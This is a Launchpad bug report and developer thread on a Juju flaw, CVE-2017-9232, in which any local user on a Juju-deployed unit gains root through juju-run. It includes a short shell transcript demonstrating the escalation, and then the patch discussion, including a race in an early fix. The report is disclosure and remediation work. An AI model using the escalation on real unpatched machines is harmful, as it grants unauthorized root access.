=== Content from bugs.launchpad.net_001302a3_20250125_015411.html ===

[Log in / Register](https://bugs.launchpad.net/juju/%2Bbug/1682411/%2Blogin)

[![](https://launchpadlibrarian.net/654137411/Canonical+Juju+dark+text%20%281%29.png)](https://launchpad.net/juju)

## [Canonical Juju](https://launchpad.net/juju)

* [Overview](https://launchpad.net/juju)
* [Code](https://code.launchpad.net/juju)
* [Bugs](https://bugs.launchpad.net/juju)
* [Blueprints](https://blueprints.launchpad.net/juju)
* [Translations](https://translations.launchpad.net/juju)
* [Answers](https://answers.launchpad.net/juju)

# juju-run unit root escalation vulnerability

Bug #1682411 reported by
[Ryan Beisner](https://launchpad.net/~1chb1n)
on 2017-04-13

[290](/%2Bhelp-bugs/bug-heat.html)

This bug affects 4 people

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [Canonical Juju](https://bugs.launchpad.net/juju) | Fix Released | Critical | [John A Meinel](https://launchpad.net/~jameinel) | [Canonical Juju 2.2-rc1](https://launchpad.net/juju/%2Bmilestone/2.2-rc1) |
|  | [2.0](https://bugs.launchpad.net/juju/2.0) | Fix Released | Critical | [John A Meinel](https://launchpad.net/~jameinel) | [Canonical Juju 2.0.4](https://launchpad.net/juju/%2Bmilestone/2.0.4) |
|  | [2.1](https://bugs.launchpad.net/juju/2.1) | Fix Released | Critical | [John A Meinel](https://launchpad.net/~jameinel) | [Canonical Juju 2.1.3](https://launchpad.net/juju/%2Bmilestone/2.1.3) |
|  | [2.2](https://bugs.launchpad.net/juju/2.2) | Fix Released | Critical | [John A Meinel](https://launchpad.net/~jameinel) | [Canonical Juju 2.2-rc1](https://launchpad.net/juju/%2Bmilestone/2.2-rc1) |
|  | [juju-core](https://bugs.launchpad.net/juju-core) | Fix Released | Critical | [John A Meinel](https://launchpad.net/~jameinel) | [juju-core 1.25.12](https://launchpad.net/juju-core/%2Bmilestone/1.25.12) |
|  | [1.25](https://bugs.launchpad.net/juju-core/1.25) | Fix Released | Critical | [John A Meinel](https://launchpad.net/~jameinel) | [juju-core 1.25.12](https://launchpad.net/juju-core/%2Bmilestone/1.25.12) |
|  | [juju (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/juju "Latest release: 0.7-0ubuntu2, uploaded to universe on 2013-08-23 11:08:12.203488+00:00 by James Page (james-page), maintained by Ubuntu Developers (ubuntu-devel-discuss-lists)") | Invalid | Undecided | Unassigned |  |
|  | [juju-core (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/juju-core "Latest release: 2.3.7-0ubuntu0.16.04.1, uploaded to main on 2018-04-24 15:59:09.354668+00:00 by Christopher Lee (veebers), maintained by Ubuntu Developers (ubuntu-devel-discuss-lists)") | Fix Released | Undecided | Unassigned |  |
|  | [juju-core-1 (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/juju-core-1 "Latest release: 1.25.6-0ubuntu1.16.04.2, uploaded to main on 2017-05-27 00:35:20.980038+00:00 by Seth Arnold (seth-arnold), maintained by Ubuntu Developers (ubuntu-devel-discuss-lists)") | Fix Released | Undecided | Unassigned |  |

### Bug Description

If a non-root and non-sudoer user has access to a console or otherwise has the ability remotely execute commands on unit, they can trivially become root with `juju-run <self-unit-name> 'whoami'`.

One specific example - this is the jenkins (non-privileged) user gaining root:

jenkins@juju-3ee1f0-temp1-0:~$ whoami

jenkins

jenkins@juju-3ee1f0-temp1-0:~$ sudo ls

[sudo] password for jenkins:

Sorry, try again.

[sudo] password for jenkins:

sudo: 1 incorrect password attempt

jenkins@juju-3ee1f0-temp1-0:~$ juju-run osci-master/0 "whoami"

root

This is Juju 2.1.2 stable.

Tags:

[patch](/juju/%2Bbugs?field.tag=patch)
[uosci](/juju/%2Bbugs?field.tag=uosci)

## CVE References

* [2017-9232](/bugs/cve/2017-9232 "Juju before 1.25.12, 2.0.x before 2.0...")

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John A Meinel (jameinel)](https://launchpad.net/~jameinel) wrote on 2017-04-13: |  |  | [#1](/juju/%2Bbug/1682411/comments/1) |
| --- | --- | --- | --- |

This isn't on arbitrary machines, but it is true on machines that were deployed with Juju.

"juju-run" runs inside of a hook context, which is inherently defined as 'run as root'.

We could potentially filter out access to juju-run via a group. The 'ubuntu' user would obviously be in that group, and charms could potentially add other users if they wanted to.

The actual goal is to allow running applications to report back information (for example juju-run status-set "blocked" "something is wrong").

We could try to limit the context of 'juju-run' to a non-root context, but then it inherently doesn't have full charm context. That would also affect people using:

 juju run --all myscript

since that would change the privileges that you have for myscript.

Its a bit hard to say "apps have access to juju-run if they want to run something in a charm context" but then say "but you don't have root access, which is what charm context is".

Needs some thought, to sort out what is really useful for an application to have access to (setting live status would be very useful), vs what vulnerabilities we raise. (apt install apache defaults to not letting the apache user get access to root.)

This isn't on arbitrary machines, but it is true on machines that were deployed with Juju.
"juju-run" runs inside of a hook context, which is inherently defined as 'run as root'.
We could potentially filter out access to juju-run via a group. The 'ubuntu' user would obviously be in that group, and charms could potentially add other users if they wanted to.
The actual goal is to allow running applications to report back information (for example juju-run status-set "blocked" "something is wrong").
We could try to limit the context of 'juju-run' to a non-root context, but then it inherently doesn't have full charm context. That would also affect people using:
juju run --all myscript
since that would change the privileges that you have for myscript.
Its a bit hard to say "apps have access to juju-run if they want to run something in a charm context" but then say "but you don't have root access, which is what charm context is".
Needs some thought, to sort out what is really useful for an application to have access to (setting live status would be very useful), vs what vulnerabilities we raise. (apt install apache defaults to not letting the apache user get access to root.)

| Changed in juju: | |
| --- | --- |
| **status**: | New → Triaged |
| **importance**: | Undecided → High |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Ryan Beisner (1chb1n)](https://launchpad.net/~1chb1n) wrote on 2017-04-13: |  |  | [#2](/juju/%2Bbug/1682411/comments/2) |
| --- | --- | --- | --- |

PS Many thanks to @thedac for bringing this up.

PS Many thanks to @thedac for bringing this up.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Anastasia (anastasia-macmood)](https://launchpad.net/~anastasia-macmood) wrote on 2017-04-18: |  |  | [#3](/juju/%2Bbug/1682411/comments/3) |
| --- | --- | --- | --- |

I've added 2.3 as a target as there will be separate solutions for 2.2 and 2.3 series. Short term solution will limit permission on a socket. Long term solution will carefully consider use cases and potentially replace global juju-run with dedicated and permission-limited commands like set-status, set-config, etc.

I've added 2.3 as a target as there will be separate solutions for 2.2 and 2.3 series. Short term solution will limit permission on a socket. Long term solution will carefully consider use cases and potentially replace global juju-run with dedicated and permission-limited commands like set-status, set-config, etc.

| Changed in juju: | |
| --- | --- |
| **milestone**: | none → 2.2-rc1 |

[Anastasia (anastasia-macmood)](https://launchpad.net/~anastasia-macmood)
on 2017-04-19

| Changed in juju: | |
| --- | --- |
| **importance**: | High → Critical |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Arnold (seth-arnold)](https://launchpad.net/~seth-arnold) wrote on 2017-04-27: |  |  | [#4](/juju/%2Bbug/1682411/comments/4) |
| --- | --- | --- | --- |

Hello; is it yet known which releases of Juju this applies to?

- 14.04's 1.25.6?

- 16.04's 2.0.2?

- 16.10's 2.0.2?

- 17.04's 2.0.02?

Are patches available yet for review?

Thanks

Hello; is it yet known which releases of Juju this applies to?
- 14.04's 1.25.6?
- 16.04's 2.0.2?
- 16.10's 2.0.2?
- 17.04's 2.0.02?
Are patches available yet for review?
Thanks

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John A Meinel (jameinel)](https://launchpad.net/~jameinel) wrote on 2017-04-28:  [**Re: [Bug 1682411] Re: juju-run unit root escalation vulnerability**](/juju/%2Bbug/1682411/comments/5) |  |  | [#5](/juju/%2Bbug/1682411/comments/5) |
| --- | --- | --- | --- |

All versions of Juju that have 'juju-run', which is probably everything

since 1.18 or so.

John

=:->

On Fri, Apr 28, 2017 at 2:06 AM, Seth Arnold <email address hidden>

wrote:

> Hello; is it yet known which releases of Juju this applies to?

>

> - 14.04's 1.25.6?

> - 16.04's 2.0.2?

> - 16.10's 2.0.2?

> - 17.04's 2.0.02?

>

> Are patches available yet for review?

>

> Thanks

>

> --

> You received this bug notification because you are subscribed to juju.

> Matching subscriptions: juju bugs

> <https://bugs.launchpad.net/bugs/1682411>

>

> Title:

> juju-run unit root escalation vulnerability

>

> To manage notifications about this bug go to:

> [https://bugs.launchpad.net/juju/+bug/1682411/+subscriptions](https://bugs.launchpad.net/juju/%2Bbug/1682411/%2Bsubscriptions)

>

All versions of Juju that have 'juju-run', which is probably everything
since 1.18 or so.
John
=:->
On Fri, Apr 28, 2017 at 2:06 AM, Seth Arnold <1682411@bugs.launchpad.net>
wrote:
> Hello; is it yet known which releases of Juju this applies to?
>
> - 14.04's 1.25.6?
> - 16.04's 2.0.2?
> - 16.10's 2.0.2?
> - 17.04's 2.0.02?
>
> Are patches available yet for review?
>
> Thanks
>
> --
> You received this bug notification because you are subscribed to juju.
> Matching subscriptions: juju bugs
> https://bugs.launchpad.net/bugs/1682411
>
> Title:
> juju-run unit root escalation vulnerability
>
> To manage notifications about this bug go to:
> https://bugs.launchpad.net/juju/+bug/1682411/+subscriptions
>

[Anastasia (anastasia-macmood)](https://launchpad.net/~anastasia-macmood)
on 2017-04-28

| **no longer affects**: | juju/2.3 |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Arnold (seth-arnold)](https://launchpad.net/~seth-arnold) wrote on 2017-05-04: |  |  | [#6](/juju/%2Bbug/1682411/comments/6) |
| --- | --- | --- | --- |

Are patches available yet for review? Thanks

Are patches available yet for review? Thanks

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tyler Hicks (tyhicks)](https://launchpad.net/~tyhicks) wrote on 2017-05-05: |  |  | [#7](/juju/%2Bbug/1682411/comments/7) |
| --- | --- | --- | --- |

I spoke with Anastasia today and she said that the juju team hasn't yet definitively determined the affected releases. I asked that she schedule that triage for next week and that the juju team provide minimal debdiffs for all affected releases that are in the Ubuntu archive. The Ubuntu security team can then build the security updates in the private security PPA and provide those builds to the juju team for QA. If everything looks good, the security team will publish the updates and publish an Ubuntu security notice.

I spoke with Anastasia today and she said that the juju team hasn't yet definitively determined the affected releases. I asked that she schedule that triage for next week and that the juju team provide minimal debdiffs for all affected releases that are in the Ubuntu archive. The Ubuntu security team can then build the security updates in the private security PPA and provide those builds to the juju team for QA. If everything looks good, the security team will publish the updates and publish an Ubuntu security notice.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John A Meinel (jameinel)](https://launchpad.net/~jameinel) wrote on 2017-05-05: |  |  | [#8](/juju/%2Bbug/1682411/comments/8) |
| --- | --- | --- | --- |

* [chmod after creating the socket](https://bugs.launchpad.net/juju/%2Bbug/1682411/%2Battachment/4872349/%2Bfiles/run.patch)
  [Edit](/juju/%2Bbug/1682411/%2Battachment/4872349)
  (602 bytes,
  text/plain)

Attached should be a sufficient patch. I need to find all the possible versions that would be affected.

Note that the socket is automatically deleted whenever the agent restarts, so 'chmod' is only valid for the lifetime of the agent, as it won't be preserved when the agent bounces.

Attached should be a sufficient patch. I need to find all the possible versions that would be affected.
Note that the socket is automatically deleted whenever the agent restarts, so 'chmod' is only valid for the lifetime of the agent, as it won't be preserved when the agent bounces.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John A Meinel (jameinel)](https://launchpad.net/~jameinel) wrote on 2017-05-05: |  |  | [#9](/juju/%2Bbug/1682411/comments/9) |
| --- | --- | --- | --- |

this is the very old source package of pyjuju

this is the very old source package of pyjuju

| Changed in juju (Ubuntu): | |
| --- | --- |
| **status**: | New → Invalid |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John A Meinel (jameinel)](https://launchpad.net/~jameinel) wrote on 2017-05-05: |  |  | [#10](/juju/%2Bbug/1682411/comments/10) |
| --- | --- | --- | --- |

Looking at the links, this probably wants a 1.25 and a 2.0 and a 2.1 (+2.2) patches.

Looking at the links, this probably wants a 1.25 and a 2.0 and a 2.1 (+2.2) patches.

| Changed in juju-core: | |
| --- | --- |
| **milestone**: | none → 1.25.12 |

[John A Meinel (jameinel)](https://launchpad.net/~jameinel)
on 2017-05-05

| Changed in juju: | |
| --- | --- |
| **assignee**: | nobody → John A Meinel (jameinel) |
| **status**: | Triaged → In Progress |
| Changed in juju-core: | |
| **assignee**: | nobody → John A Meinel (jameinel) |
| **importance**: | Undecided → Critical |
| **status**: | New → In Progress |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John A Meinel (jameinel)](https://launchpad.net/~jameinel) wrote on 2017-05-05: |  |  | [#19](/juju/%2Bbug/1682411/comments/19) |
| --- | --- | --- | --- |

I'm planning on merging whatever lands into 2.1 into develop directly from the 2.1 branch instead of landing a separate 2.2 branch.

I'm planning on merging whatever lands into 2.1 into develop directly from the 2.1 branch instead of landing a separate 2.2 branch.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Joel Sing (jsing)](https://launchpad.net/~jsing) wrote on 2017-05-05: |  |  | [#20](/juju/%2Bbug/1682411/comments/20) |
| --- | --- | --- | --- |

FWIW this fix still leaves a race that is potentially exploitable - if you can either force the agent to restart (or know that it will restart), you just have to continuously open the socket and if you land between the net.Listen and os.Chmod calls, you still have root. This may be acceptable, but it does not fully resolve the issue.

A more correct fix is to restrict access by changing/restricting permissions on the directory containing the socket so that the socket is never accessible. The other (more complex) alternative is to open the socket manually with the correct mode.

FWIW this fix still leaves a race that is potentially exploitable - if you can either force the agent to restart (or know that it will restart), you just have to continuously open the socket and if you land between the net.Listen and os.Chmod calls, you still have root. This may be acceptable, but it does not fully resolve the issue.
A more correct fix is to restrict access by changing/restricting permissions on the directory containing the socket so that the socket is never accessible. The other (more complex) alternative is to open the socket manually with the correct mode.

[William Grant (wgrant)](https://launchpad.net/~wgrant)
on 2017-05-05

| Changed in juju (Ubuntu): | |
| --- | --- |
| **importance**: | Undecided → Critical |
| **importance**: | Critical → Undecided |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2017-05-05: |  |  | [#21](/juju/%2Bbug/1682411/comments/21) |
| --- | --- | --- | --- |

Status changed to 'Confirmed' because the bug affects multiple users.

Status changed to 'Confirmed' because the bug affects multiple users.

| Changed in juju-core (Ubuntu): | |
| --- | --- |
| **status**: | New → Confirmed |
| Changed in juju-core-1 (Ubuntu): | |
| **status**: | New → Confirmed |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John A Meinel (jameinel)](https://launchpad.net/~jameinel) wrote on 2017-05-05: |  |  | [#23](/juju/%2Bbug/1682411/comments/23) |
| --- | --- | --- | --- |

Here is an alternative that sets umask before creating the file. I would have thought that since we aren't accepting anything on the socket it would have been ok, but this should still prevent us from creating the file with the wrong mode, correct?

I wasn't able to find a trivial way to 'mksock' with the right parameters and get that passed into a net.Listener (I believe you can open them from a file descriptor, but I didn't see a mksock function).

Here is an alternative that sets umask before creating the file. I would have thought that since we aren't accepting anything on the socket it would have been ok, but this should still prevent us from creating the file with the wrong mode, correct?
I wasn't able to find a trivial way to 'mksock' with the right parameters and get that passed into a net.Listener (I believe you can open them from a file descriptor, but I didn't see a mksock function).

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John A Meinel (jameinel)](https://launchpad.net/~jameinel) wrote on 2017-05-05: |  |  | [#24](/juju/%2Bbug/1682411/comments/24) |
| --- | --- | --- | --- |

previous one was a patch against previous, this is just the patch against unmodified juju-1.25

previous one was a patch against previous, this is just the patch against unmodified juju-1.25

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John A Meinel (jameinel)](https://launchpad.net/~jameinel) wrote on 2017-05-05: |  |  | [#25](/juju/%2Bbug/1682411/comments/25) |
| --- | --- | --- | --- |

* [set umask before creating socket 1.25](https://bugs.launchpad.net/juju/%2Bbug/1682411/%2Battachment/4872377/%2Bfiles/umask-2.diff)
  [Edit](/juju/%2Bbug/1682411/%2Battachment/4872377)
  (943 bytes,
  text/plain)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John A Meinel (jameinel)](https://launchpad.net/~jameinel) wrote on 2017-05-05: |  |  | [#26](/juju/%2Bbug/1682411/comments/26) |
| --- | --- | --- | --- |

Per request, there are no PRs up for these patches. If we find that this is a valid patch, I can commit it directly to the github repository instead of going via the bot, etc.

Per request, there are no PRs up for these patches. If we find that this is a valid patch, I can commit it directly to the github repository instead of going via the bot, etc.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John A Meinel (jameinel)](https://launchpad.net/~jameinel) wrote on 2017-05-05: |  |  | [#27](/juju/%2Bbug/1682411/comments/27) |
| --- | --- | --- | --- |

* [set umask before creating socket 2.x](https://bugs.launchpad.net/juju/%2Bbug/1682411/%2Battachment/4872378/%2Bfiles/umask-2.x.diff)
  [Edit](/juju/%2Bbug/1682411/%2Battachment/4872378)
  (625 bytes,
  text/plain)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Andrew Wilkins (axwalk)](https://launchpad.net/~axwalk) wrote on 2017-05-06: |  |  | [#28](/juju/%2Bbug/1682411/comments/28) |
| --- | --- | --- | --- |

umask applies to the process, so doing that may inadvertently affect other code in the same process. Is that OK? I'm not sure there's an alternative for abstract domain sockets though.

Also, what about Windows?

umask applies to the process, so doing that may inadvertently affect other code in the same process. Is that OK? I'm not sure there's an alternative for abstract domain sockets though.
Also, what about Windows?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Arnold (seth-arnold)](https://launchpad.net/~seth-arnold) wrote on 2017-05-06: |  |  | [#29](/juju/%2Bbug/1682411/comments/29) |
| --- | --- | --- | --- |

If it's possible that unknown other operations may be executing concurrently in the same process then probably a new directory should be created with restricted permissions that could be used for creating the socket, which would then be inaccessible to all processes without CAP\_DAC\_OVERRIDE and/or CAP\_DAC\_READ\_SEARCH. Once the permissions are set correctly then the directory permissions could be widened.

I didn't find any reference to AF\_UNIX on what appears to be the Windows socket(2) analog: [https://msdn.microsoft.com/en-us/library/windows/desktop/ms740506(v=vs.85).aspx](https://msdn.microsoft.com/en-us/library/windows/desktop/ms740506%28v%3Dvs.85%29.aspx)

Thanks

If it's possible that unknown other operations may be executing concurrently in the same process then probably a new directory should be created with restricted permissions that could be used for creating the socket, which would then be inaccessible to all processes without CAP\_DAC\_OVERRIDE and/or CAP\_DAC\_READ\_SEARCH. Once the permissions are set correctly then the directory permissions could be widened.
I didn't find any reference to AF\_UNIX on what appears to be the Windows socket(2) analog: https://msdn.microsoft.com/en-us/library/windows/desktop/ms740506(v=vs.85).aspx
Thanks

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John A Meinel (jameinel)](https://launchpad.net/~jameinel) wrote on 2017-05-06: |  |  | [#30](/juju/%2Bbug/1682411/comments/30) |
| --- | --- | --- | --- |

So would creating a subdirectory, setting that to restricted permissions, then creating the socket in that directory with restricted permissions, then renaming the socket to the right directory be ok?

I really don't know what to do for the Windows socket.

So would creating a subdirectory, setting that to restricted permissions, then creating the socket in that directory with restricted permissions, then renaming the socket to the right directory be ok?
I really don't know what to do for the Windows socket.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Arnold (seth-arnold)](https://launchpad.net/~seth-arnold) wrote on 2017-05-06: |  |  | [#31](/juju/%2Bbug/1682411/comments/31) |
| --- | --- | --- | --- |

I believe that should work:

- I don't see any caveats about renaming Unix domain sockets in rename(2)

- A quick test with socat UNIX-LISTEN:foo - paired with socat - UNIX-CONNECT:foo wasn't interrupted when renaming the socket 'foo'.

The source directory and the target directory should be on the same filesystem.

Thanks

I believe that should work:
- I don't see any caveats about renaming Unix domain sockets in rename(2)
- A quick test with socat UNIX-LISTEN:foo - paired with socat - UNIX-CONNECT:foo wasn't interrupted when renaming the socket 'foo'.
The source directory and the target directory should be on the same filesystem.
Thanks

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Nicholas Skaggs (nskaggs)](https://launchpad.net/~nskaggs) wrote on 2017-05-06: |  |  | [#32](/juju/%2Bbug/1682411/comments/32) |
| --- | --- | --- | --- |

Do you agree releasing the fix can be done by simply releasing new agents into simplestreams?

Do you agree releasing the fix can be done by simply releasing new agents into simplestreams?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Andrew Wilkins (axwalk)](https://launchpad.net/~axwalk) wrote on 2017-05-07: |  |  | [#33](/juju/%2Bbug/1682411/comments/33) |
| --- | --- | --- | --- |

It seems my mention of abstract domain sockets was missed, so I'll restate in more detail. This doesn't apply to juju-run, but it does apply to jujuc (the hook tools: relation-set, relation-get, etc.). The jujuc socket is an abstract domain socket, so it has no relationship to the filesystem; abstract domain sockets aren't affected by filesystem permissions. I think you have to use SCM\_CREDENTIALS to do any kind of auth on those. This is technically a different bug I guess, but it would be good to at least consider how to fix that at the same time.

Seth: on Windows we use named pipes. We'll need to look at whether it is similarly affected, but that shouldn't hold up a fix for Linux. Looking at the gopkg.in/natefinch/npipe.v2 package, and the CreateNamedPipe docs, it appears that the default security descriptor is being used, which will restrict full access to administrators and the creator.

It seems my mention of abstract domain sockets was missed, so I'll restate in more detail. This doesn't apply to juju-run, but it does apply to jujuc (the hook tools: relation-set, relation-get, etc.). The jujuc socket is an abstract domain socket, so it has no relationship to the filesystem; abstract domain sockets aren't affected by filesystem permissions. I think you have to use SCM\_CREDENTIALS to do any kind of auth on those. This is technically a different bug I guess, but it would be good to at least consider how to fix that at the same time.
Seth: on Windows we use named pipes. We'll need to look at whether it is similarly affected, but that shouldn't hold up a fix for Linux. Looking at the gopkg.in/natefinch/npipe.v2 package, and the CreateNamedPipe docs, it appears that the default security descriptor is being used, which will restrict full access to administrators and the creator.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John A Meinel (jameinel)](https://launchpad.net/~jameinel) wrote on 2017-05-08: |  |  | [#34](/juju/%2Bbug/1682411/comments/34) |
| --- | --- | --- | --- |

Right. We do need answers for abstract domain sockets (though from what

you've mentioned, it sounds like we're mostly there already).

This is more about the CVE that we need to get a set of releases out across

the board.

On Sun, May 7, 2017 at 8:26 AM, Andrew Wilkins <<email address hidden>

> wrote:

> It seems my mention of abstract domain sockets was missed, so I'll

> restate in more detail. This doesn't apply to juju-run, but it does

> apply to jujuc (the hook tools: relation-set, relation-get, etc.). The

> jujuc socket is an abstract domain socket, so it has no relationship to

> the filesystem; abstract domain sockets aren't affected by filesystem

> permissions. I think you have to use SCM\_CREDENTIALS to do any kind of

> auth on those. This is technically a different bug I guess, but it would

> be good to at least consider how to fix that at the same time.

>

> Seth: on Windows we use named pipes. We'll need to look at whether it is

> similarly affected, but that shouldn't hold up a fix for Linux. Looking

> at the gopkg.in/natefinch/npipe.v2 package, and the CreateNamedPipe

> docs, it appears that the default security descriptor is being used,

> which will restrict full access to administrators and the creator.

>

> --

> You received this bug notification because you are a bug assignee.

> Matching subscriptions: juju bugs

> <https://bugs.launchpad.net/bugs/1682411>

>

> Title:

> juju-run unit root escalation vulnerability

>

> To manage notifications about this bug go to:

> [https://bugs.launchpad.net/juju/+bug/1682411/+subscriptions](https://bugs.launchpad.net/juju/%2Bbug/1682411/%2Bsubscriptions)

>

Right. We do need answers for abstract domain sockets (though from what
you've mentioned, it sounds like we're mostly there already).
This is more about the CVE that we need to get a set of releases out across
the board.
On Sun, May 7, 2017 at 8:26 AM, Andrew Wilkins <andrew.wilkins@canonical.com
> wrote:
> It seems my mention of abstract domain sockets was missed, so I'll
> restate in more detail. This doesn't apply to juju-run, but it does
> apply to jujuc (the hook tools: relation-set, relation-get, etc.). The
> jujuc socket is an abstract domain socket, so it has no relationship to
> the filesystem; abstract domain sockets aren't affected by filesystem
> permissions. I think you have to use SCM\_CREDENTIALS to do any kind of
> auth on those. This is technically a different bug I guess, but it would
> be good to at least consider how to fix that at the same time.
>
> Seth: on Windows we use named pipes. We'll need to look at whether it is
> similarly affected, but that shouldn't hold up a fix for Linux. Looking
> at the gopkg.in/natefinch/npipe.v2 package, and the CreateNamedPipe
> docs, it appears that the default security descriptor is being used,
> which will restrict full access to administrators and the creator.
>
> --
> You received this bug notification because you are a bug assignee.
> Matching subscriptions: juju bugs
> https://bugs.launchpad.net/bugs/1682411
>
> Title:
> juju-run unit root escalation vulnerability
>
> To manage notifications about this bug go to:
> https://bugs.launchpad.net/juju/+bug/1682411/+subscriptions
>

[Canonical Juju QA Bot (juju-qa-bot)](https://launchpad.net/~juju-qa-bot)
on 2017-05-11

| Changed in juju: | |
| --- | --- |
| **milestone**: | 2.2-beta4 → 2.2-rc1 |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Arnold (seth-arnold)](https://launchpad.net/~seth-arnold) wrote on 2017-05-15: |  |  | [#35](/juju/%2Bbug/1682411/comments/35) |
| --- | --- | --- | --- |

Re-reading the comments here, there's a few loose ends:

- First, if we decide to go the route of creating a new directory for the socket, the directory should be created with restricted permissions (see mkdir(2)) rather than creating the directory and then setting the directory's permissions to be restrictive. I'm sorry I missed this point earlier.

- Second, I did entirely overlook the abstract (unix domain address?) sockets; the patches here were all for unix domain sockets with apparently filesystem names. Are there more sockets that need further constraints on their use?

Thanks

Re-reading the comments here, there's a few loose ends:
- First, if we decide to go the route of creating a new directory for the socket, the directory should be created with restricted permissions (see mkdir(2)) rather than creating the directory and then setting the directory's permissions to be restrictive. I'm sorry I missed this point earlier.
- Second, I did entirely overlook the abstract (unix domain address?) sockets; the patches here were all for unix domain sockets with apparently filesystem names. Are there more sockets that need further constraints on their use?
Thanks

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John A Meinel (jameinel)](https://launchpad.net/~jameinel) wrote on 2017-05-17: |  |  | [#36](/juju/%2Bbug/1682411/comments/36) |
| --- | --- | --- | --- |

* [1.25 use tempdir and chmod for socket creation](https://bugs.launchpad.net/juju/%2Bbug/1682411/%2Battachment/4878041/%2Bfiles/juju-run-1.25-tempdir.diff)
  [Edit](/juju/%2Bbug/1682411/%2Battachment/4878041)
  (1.6 KiB,
  text/plain)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John A Meinel (jameinel)](https://launchpad.net/~jameinel) wrote on 2017-05-17: |  |  | [#37](/juju/%2Bbug/1682411/comments/37) |
| --- | --- | --- | --- |

* [2.x use tempdir and chmod for socket creation](https://bugs.launchpad.net/juju/%2Bbug/1682411/%2Battachment/4878042/%2Bfiles/juju-run-2.x-tempdir.diff)
  [Edit](/juju/%2Bbug/1682411/%2Battachment/4878042)
  (1.9 KiB,
  text/plain)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Arnold (seth-arnold)](https://launchpad.net/~seth-arnold) wrote on 2017-05-22: |  |  | [#38](/juju/%2Bbug/1682411/comments/38) |
| --- | --- | --- | --- |

There's a small cosmetic issue in an error message:

+ listener, err := net.Listen("unix", tempSocketPath)

+ if err != nil {

+ logger.Errorf("failed to listen on unix:%s: %v", socketPath, err)

Perhaps tempSocketPath should be logged instead of socketPath; that more directly reflects the potentially failed operation.

Thanks

There's a small cosmetic issue in an error message:
+ listener, err := net.Listen("unix", tempSocketPath)
+ if err != nil {
+ logger.Errorf("failed to listen on unix:%s: %v", socketPath, err)
Perhaps tempSocketPath should be logged instead of socketPath; that more directly reflects the potentially failed operation.
Thanks

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John A Meinel (jameinel)](https://launchpad.net/~jameinel) wrote on 2017-05-23: |  |  | [#39](/juju/%2Bbug/1682411/comments/39) |
| --- | --- | --- | --- |

* [1.25 include controller\_version when checking for charm updates](https://bugs.launchpad.net/juju/%2Bbug/1682411/%2Battachment/4882073/%2Bfiles/1.25-report-version-1682411.diff)
  [Edit](/juju/%2Bbug/1682411/%2Battachment/4882073)
  (2.2 KiB,
  text/plain)

That should, indeed be fixed. Rick Harding also had a good idea that we should port the 'controller\_version' string to being reported to charmstore so we can track how many people are switching over to updated versions. We already have similar code in the 2.0 series, so we only really need this patch to the 1.25 series.

That should, indeed be fixed. Rick Harding also had a good idea that we should port the 'controller\_version' string to being reported to charmstore so we can track how many people are switching over to updated versions. We already have similar code in the 2.0 series, so we only really need this patch to the 1.25 series.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Ian Booth (wallyworld)](https://launchpad.net/~wallyworld) wrote on 2017-05-24: |  |  | [#40](/juju/%2Bbug/1682411/comments/40) |
| --- | --- | --- | --- |

I've patched all relevant Juju branches: 1.25, 2.0, 2.1, develop

The patch includes the suggestion from comment #38 to log tempSocketPath

I've patched all relevant Juju branches: 1.25, 2.0, 2.1, develop
The patch includes the suggestion from comment #38 to log tempSocketPath

| Changed in juju: | |
| --- | --- |
| **status**: | In Progress → Fix Committed |
| Changed in juju-core: | |
| **status**: | In Progress → Fix Committed |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Arnold (seth-arnold)](https://launchpad.net/~seth-arnold) wrote on 2017-05-25: |  |  | [#41](/juju/%2Bbug/1682411/comments/41) |
| --- | --- | --- | --- |

CVE from MITRE:

Use CVE-2017-9232.

Thanks

CVE from MITRE:
Use CVE-2017-9232.
Thanks

